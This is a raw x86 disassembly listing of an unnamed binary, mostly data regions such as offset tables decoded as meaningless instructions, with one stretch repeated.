  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    ah,dl
  412425:	cmp    al,BYTE PTR [ebx]
  412427:	add    ah,dl
  412429:	sub    al,BYTE PTR [ebx]
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
